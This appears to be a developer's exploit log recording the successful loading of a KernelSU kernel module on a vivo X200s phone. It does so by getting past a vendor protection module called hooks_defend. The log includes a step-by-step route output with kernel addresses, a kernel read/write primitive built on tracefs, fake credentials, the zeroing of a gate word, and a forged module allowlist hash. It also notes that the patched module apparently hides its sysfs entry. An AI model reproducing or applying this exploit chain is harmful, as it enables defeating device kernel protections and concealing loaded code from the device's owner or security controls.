# own127 SUCCESS — KernelSU LKM loaded on vivo X200s (2026-11-02 13:40)

First successful `init_module` past hooks_defend on this device.

## One-line result
`[gate127] SUCCESS uptime=56.06` — `[al] init_module rc=0 errno=0`,
`/proc/modules` line 1: `kernelsu 180224 0 - Live 0x0000000000000000 (O)`
(module count 636->637->638 across boots; kernel was already printing
`KernelSU: tp_marker: ...` lines in kmsg).

## Boot story (retry after a device self-reboot)
- Boot A (fixed binary, first attempt): chain ran but the device **self-rebooted
  at the fake-cred verify stage** (uptime ~135) — pre-gate death, so the allowed
  retry was taken. Nothing wrong with the route.
- Boot B (retry): chain 19.97 -> gate 40.69 (20.7 s, fast boot), route 15.4 s,
  success at uptime 56.06.

## Route log (boot B, abridged)
```
[gate127] start uid=0 euid=0 pid=7483 uptime=40.69
[race] /proc/modules modules=653 hooks_defend=1 index=444 uptime=40.69
[gate127] hooks_defend PRESENT -> kernel-write route
[kw] slide=0x165be00000
[kr] selftest 50/50 ok uptime=42.2
[kw] /proc/modules idx=444/653 dir=bwd fwd=503 bwd=269
[mod] FOUND hooks_defend hop=194 dir=bwd node=0xffffffd6d8c23e08 mod=0xffffffd6d8c23e00
[mem] type0 base=0xffffffd6d8c1e000 size=0x4000      (MOD_TEXT)
[mem] type1 base=0xffffffd6d8c23000 size=0x2000      (MOD_DATA)
[mem] type2 base=0xffffffd6d8c26000 size=0x2000      (MOD_RODATA)
[mem] type3 base=0xffffffd6d8c29000 size=0x1000      (MOD_RO_AFTER_INIT)
[mem] type4..6 base=0 size=0                          (init freed, [permanent])
[kw] hooks_defend mod=0xffffffd6d8c23e00 MOD_DATA=0xffffffd6d8c23000 size=0x2000
[kw] .cs at MOD_DATA+0 (both magics ok)               .cs = 0xffffffd6d8c23000
[kw] perm[7]=8 perm[0..9]=0c040d0102090a080b07
[kw] g(7) at 0xffffffd6d8c23148 = 0x40c000000010101
[kw] planting zero at aligned word 0xffffffd6d8c23148 (covers g(7))
[plant] tracefs req 0xffffffd6d8c23148 mode=0
[plant] req done ok=1
[plant] 0xffffffd6d8c23148 mode=0 zeroed try=0 i=0
[kw] g(7) cleared uptime=55.8
[kw] insko_dfd_on show='0'
[ko] size=330664 read=330664 slide=0x165be00000
[insmod] bound=225 missing=1
[al] image sha256[0:8]=998bfd7fcd6b512a len=330664
[al] insko_dfd_on='0'
[bsp] khs_num <= 2 bytes write=2 errno=0     (364 -> 1)
[bsp] write_hash <= 8 bytes write=8 errno=0
[al] khs_num now='1'
[al] init_module rc=0 errno=0 uid=0 euid=0
[al] kmsg(65112): ... KernelSU: tp_marker: ...
[gate127] SUCCESS uptime=56.06
```

## Why it worked
- kread v3 (private trace instance) is reliable: 50/50.
- BTF offsets are right: `struct module.mem@0x1c0`, `module_memory{base@0,size@8}`,
  MOD_DATA=1; mem sum = 0x9000 = /proc/modules size.
- `.cs` is self-identifying by its two 0xdeadbeef magics and sits at MOD_DATA+0.
- `g(7)` is `.cs[0x140+perm[7]]`; plant_req(MODE_ZERO) on the aligned 8-byte word
  clears the khs_num/write_hash gate without touching the write-once-sealed
  sysfs route.
- Allowlist regenerated: khs_num=1 (allocates one u64 slot), write_hash =
  SHA256(bound kernelsu image)[0:8] native LE -> pre_handler `aec()==0` ->
  sub_2020 allowlist hit -> load_module runs -> rc=0.

## Notes / follow-ups
- `/sys/module/kernelsu` is absent even though /proc/modules lists the module
  (the prepared kernelsu_patched.ko likely removes its sysfs dir to hide).
- The fake-cred parent parks holding the page; device stays alive, reboot
  clears it. One exploit run per boot still applies.
- Next: verify the KernelSU manager UI / ksud interface while this module is
  loaded (would need a boot where the manager's own libksud is exercised).
- Boot-to-boot flakiness: chain can die pre-gate (slide-verify failure, device
  self-reboot at the cred verify). The route itself is deterministic once the
  gate runs.
